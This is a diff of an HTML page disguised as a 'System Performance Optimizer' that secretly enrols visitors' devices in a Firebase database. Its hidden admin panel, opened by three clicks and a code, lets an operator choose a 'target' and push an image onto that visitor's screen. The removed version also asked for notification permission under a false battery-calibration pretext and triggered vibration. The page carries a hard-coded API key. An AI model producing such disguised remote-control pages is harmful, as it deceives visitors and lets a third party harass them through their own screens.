@@ -5,65 +5,47 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Performance Optimizer</title>
     <style>
-        /* ГЛУБОКИЙ ТЕМНЫЙ ГРАДИЕНТ И АНИМИРОВАННЫЕ ШАРЫ */
         body, html {
-            margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', Roboto, sans-serif;
-            background: radial-gradient(circle at center, #001f3f 0%, #000000 100%);
+            margin: 0; padding: 0; height: 100%; font-family: 'Segoe UI', sans-serif;
+            background: radial-gradient(circle at center, #001f3f 0%, #000 100%);
             color: white; display: flex; align-items: center; justify-content: center; overflow: hidden;
         }
 
-        /* ПЛАВАЮЩИЕ ШАРЫ */
-        .ball {
-            position: absolute; border-radius: 50%; filter: blur(60px); z-index: 0; opacity: 0.4;
-            animation: move linear infinite;
-        }
-        .b1 { width: 300px; height: 300px; background: #0074D9; left: -10%; top: 10%; animation-duration: 20s; }
-        .b2 { width: 250px; height: 250px; background: #7FDBFF; right: -5%; bottom: 10%; animation-duration: 25s; }
-        .b3 { width: 200px; height: 200px; background: #39CCCC; left: 40%; top: 60%; animation-duration: 18s; }
+        /* Анимированный фон */
+        .ball { position: absolute; border-radius: 50%; filter: blur(60px); z-index: 0; opacity: 0.3; animation: move 20s linear infinite; }
+        .b1 { width: 300px; height: 300px; background: #0074D9; left: -10%; top: 10%; }
+        .b2 { width: 250px; height: 250px; background: #7FDBFF; right: -5%; bottom: 10%; animation-delay: -5s; }
+        @keyframes move { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(100px, 50px); } }
 
-        @keyframes move {
-            0%, 100% { transform: translate(0, 0); }
-            25% { transform: translate(50px, 100px); }
-            50% { transform: translate(-100px, 50px); }
-            75% { transform: translate(80px, -80px); }
-        }
-
-        /* СТЕКЛЯННАЯ КАРТОЧКА БЕЗ ПРЯМОУГОЛЬНЫХ ПОЛОСОК */
         .glass {
-            position: relative; z-index: 10;
-            background: rgba(255, 255, 255, 0.05); border-radius: 30px;
-            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5); text-align: center; 
-            width: 85%; max-width: 380px;
+            position: relative; z-index: 10; background: rgba(255, 255, 255, 0.05);
+            border-radius: 30px; backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; text-align: center; width: 85%; max-width: 380px;
         }
         
         .btn {
-            background: linear-gradient(135deg, #0074D9, #2ECC40); border: none;
-            padding: 16px; border-radius: 15px; color: white; font-weight: bold;
-            width: 100%; cursor: pointer; margin-top: 25px; text-transform: uppercase;
-            box-shadow: 0 5px 20px rgba(46, 204, 64, 0.3); transition: 0.3s;
+            background: linear-gradient(135deg, #0074D9, #2ECC40); border: none; padding: 16px;
+            border-radius: 15px; color: white; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px;
         }
-        .btn:active { transform: scale(0.96); }
 
-        /* ЧЕРНАЯ АДМИНКА ДЛЯ ТЕБЯ */
-        #adminPanel {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #080808; z-index: 1000; padding: 25px; box-sizing: border-box; overflow-y: auto;
-        }
-        .device-card {
-            background: #151515; padding: 18px; border-radius: 15px; margin-bottom: 12px;
-            border: 1px solid #333; cursor: pointer; transition: 0.2s;
-        }
-        .device-card:active { border-color: #0074D9; background: #1a1a1a; }
+        /* АДМИНКА */
+        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #080808; z-index: 1000; padding: 20px; box-sizing: border-box; overflow-y: auto; }
+        .device-card { background: #151515; padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
 
+        /* ЭМУЛЯТОР С МАСШТАБИРОВАНИЕМ */
         .emulator {
-            width: 260px; height: 420px; background: #000; margin: 25px auto;
-            position: relative; border: 2px solid #444; border-radius: 35px; overflow: hidden;
-            box-shadow: 0 0 30px rgba(0,116,217,0.2);
+            width: 240px; height: 400px; background: #000; margin: 20px auto;
+            position: relative; border: 2px solid #444; border-radius: 20px; overflow: hidden;
         }
-        #dragImg { position: absolute; width: 120px; cursor: move; touch-action: none; display: none; transform: translate(-50%, -50%); }
+        #dragContainer { position: absolute; width: 100px; transform: translate(-50%, -50%); touch-action: none; border: 1px dashed rgba(255,255,255,0.3); }
+        #dragImg { width: 100%; display: block; pointer-events: none; }
         
+        /* Кружки для изменения размера */
+        .resizer {
+            position: absolute; width: 15px; height: 15px; background: #0074D9;
+            border-radius: 50%; bottom: -7px; right: -7px; cursor: nwse-resize;
+        }
+
         #trollImage { position: fixed; z-index: 99999; display: none; pointer-events: none; transform: translate(-50%, -50%); }
     </style>
 </head>
@@ -71,33 +53,29 @@
 
     <div class="ball b1"></div>
     <div class="ball b2"></div>
-    <div class="ball b3"></div>
 
     <div class="glass" id="userView">
-        <div id="secretArea" style="display:inline-block; -webkit-tap-highlight-color: transparent;">
-            <h2 id="secretTrigger" style="user-select:none; margin-bottom: 5px;">SYSTEM OPTIMIZER</h2>
-            <div style="width: 50px; height: 4px; background: #0074D9; margin: 0 auto 20px; border-radius: 2px;"></div>
+        <div id="secretArea">
+            <h2 id="secretTrigger" style="user-select:none;">SYSTEM OPTIMIZER</h2>
+            <div style="width: 40px; height: 3px; background: #0074D9; margin: 5px auto 20px;"></div>
         </div>
-        <div style="font-size: 50px; margin-bottom: 20px;">🔋</div>
-        <p style="color: #aaa; font-size: 14px; line-height: 1.5;">Разрешите доступ к уведомлениям для калибровки датчиков и оптимизации расхода заряда батареи.</p>
+        <p style="color: #aaa; font-size: 14px;">Нажмите для калибровки системы</p>
         <button class="btn" onclick="askPermission()">Оптимизировать</button>
     </div>
 
     <div id="adminPanel">
-        <h2 style="color:#7FDBFF; letter-spacing: 2px;">ROOT TERMINAL</h2>
-        <div id="deviceList" style="margin-top: 20px;">Поиск устройств в сети...</div>
-
-        <div id="ctrl" style="display:none; margin-top: 30px;">
-            <div style="background: #111; padding: 20px; border-radius: 20px; border: 1px solid #222;">
-                <h4 style="margin:0 0 15px 0">Target: <span id="targetName" style="color:#2ECC40"></span></h4>
-                <label class="btn" style="display:block; text-align:center; background: #333;">
-                    ВЫБРАТЬ ОБЪЕКТ
-                    <input type="file" id="fileIn" accept="image/*" onchange="loadImg(this)" style="display:none">
-                </label>
-                <div class="emulator" id="emul"><img id="dragImg"></div>
-                <button class="btn" onclick="fire()" style="background: #FF4136; box-shadow: 0 5px 20px rgba(255, 65, 54, 0.4);">АТАКОВАТЬ</button>
-                <button class="btn" style="background:transparent; border: 1px solid #444;" onclick="location.reload()">ОТМЕНА</button>
+        <h2 style="color:#7FDBFF">ROOT TERMINAL</h2>
+        <div id="deviceList">Ожидание подключений...</div>
+        <div id="ctrl" style="display:none;">
+            <label class="btn" style="display:block; text-align:center; background: #333;">ВЫБРАТЬ ФОТО <input type="file" id="fileIn" accept="image/*" onchange="loadImg(this)" style="display:none"></label>
+            <div class="emulator" id="emul">
+                <div id="dragContainer" style="left:50%; top:50%; display:none;">
+                    <img id="dragImg">
+                    <div class="resizer" id="resizeHandle"></div>
+                </div>
             </div>
+            <button class="btn" onclick="fire()" style="background: #FF4136">ЗАПУСТИТЬ</button>
+            <button class="btn" style="background:transparent; border:1px solid #444;" onclick="location.reload()">ВЫХОД</button>
         </div>
     </div>
 
@@ -107,7 +85,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        // ТВОЯ КОНФИГУРАЦИЯ FIREBASE
         const firebaseConfig = {
             apiKey: "AIzaSyBoC20eVfGmSpZC-XfE1hF8NNmpaNEmgh8",
             authDomain: "testing-c051b.firebaseapp.com",
@@ -121,30 +98,21 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         const myId = "node_" + Math.random().toString(36).substr(2, 5);
-        let selectedId = null, b64 = null, curX = 50, curY = 50;
+        let selectedId = null, b64 = null, curX = 50, curY = 50, curW = 100;
 
-        // ВХОД: 3 клика по SYSTEM OPTIMIZER
+        // Вход в админку
         let clicks = 0;
         document.getElementById('secretArea').onclick = () => {
             clicks++;
             if(clicks >= 3) {
-                if(prompt("Enter Root Code:") === "49231") {
-                    document.getElementById('adminPanel').style.display = 'block';
-                    loadDevices();
-                }
+                if(prompt("Code:") === "49231") { document.getElementById('adminPanel').style.display = 'block'; loadDevices(); }
                 clicks = 0;
             }
         };
 
         function askPermission() {
-            Notification.requestPermission().then(p => {
-                db.ref('devices/' + myId).set({
-                    name: navigator.userAgent.includes("Android") ? "Android Dev" : "Web Client",
-                    online: true,
-                    t: Date.now()
-                });
-                alert("Система оптимизирована. Не закрывайте вкладку для поддержания эффекта.");
-            });
+            db.ref('devices/' + myId).set({ name: "User_" + myId, online: true });
+            alert("Готово!");
         }
 
         function loadDevices() {
@@ -155,12 +123,8 @@
                     if(child.key === myId) return;
                     let d = document.createElement('div');
                     d.className = "device-card";
-                    d.innerHTML = `📡 <b>${child.val().name}</b><br><small style="color:#666">ID: ${child.key}</small>`;
-                    d.onclick = () => {
-                        selectedId = child.key;
-                        document.getElementById('ctrl').style.display = 'block';
-                        document.getElementById('targetName').innerText = child.val().name;
-                    };
+                    d.innerHTML = `📡 <b>${child.val().name}</b>`;
+                    d.onclick = () => { selectedId = child.key; document.getElementById('ctrl').style.display = 'block'; };
                     list.appendChild(d);
                 });
             });
@@ -170,36 +134,47 @@
             const r = new FileReader();
             r.onload = e => {
                 b64 = e.target.result;
-                const i = document.getElementById('dragImg');
-                i.src = b64; i.style.display = 'block';
-                i.style.left = "50%"; i.style.top = "50%";
+                const cont = document.getElementById('dragContainer');
+                document.getElementById('dragImg').src = b64;
+                cont.style.display = 'block';
             };
             r.readAsDataURL(input.files[0]);
         }
 
+        // Логика перемещения и изменения размера
+        const cont = document.getElementById('dragContainer');
+        const handle = document.getElementById('resizeHandle');
         const emul = document.getElementById('emul');
-        const drag = document.getElementById('dragImg');
+
         emul.ontouchmove = e => {
-            e.preventDefault();
-            let t = e.touches[0], rect = emul.getBoundingClientRect();
-            curX = ((t.clientX - rect.left) / rect.width) * 100;
-            curY = ((t.clientY - rect.top) / rect.height) * 100;
-            drag.style.left = curX + "%"; drag.style.top = curY + "%";
+            if (e.target === handle) {
+                // Изменение размера
+                let t = e.touches[0], rect = cont.getBoundingClientRect();
+                curW = t.clientX - rect.left;
+                cont.style.width = curW + "px";
+            } else {
+                // Перемещение
+                e.preventDefault();
+                let t = e.touches[0], rect = emul.getBoundingClientRect();
+                curX = ((t.clientX - rect.left) / rect.width) * 100;
+                curY = ((t.clientY - rect.top) / rect.height) * 100;
+                cont.style.left = curX + "%";
+                cont.style.top = curY + "%";
+            }
         };
 
         function fire() {
-            if(!selectedId || !b64) return alert("Error: No target or image");
-            db.ref('cmds/' + selectedId).set({ img: b64, x: curX, y: curY, t: Date.now() });
-            alert("COMMAND EXECUTED");
+            db.ref('cmds/' + selectedId).set({ img: b64, x: curX, y: curY, w: curW, t: Date.now() });
+            alert("ОТПРАВЛЕНО");
         }
 
         db.ref('cmds/' + myId).on('value', s => {
             const d = s.val(); if(!d) return;
             const i = document.getElementById('trollImage');
-            i.src = d.img; i.style.left = d.x + "%"; i.style.top = d.y + "%"; i.style.display = 'block';
-            if(navigator.vibrate) navigator.vibrate([300, 100, 300]);
+            i.src = d.img; i.style.left = d.x + "%"; i.style.top = d.y + "%";
+            i.style.width = d.w + "px"; // Теперь размер берется из админки!
+            i.style.display = 'block';
         });
     </script>
 </body>
 </html>
-
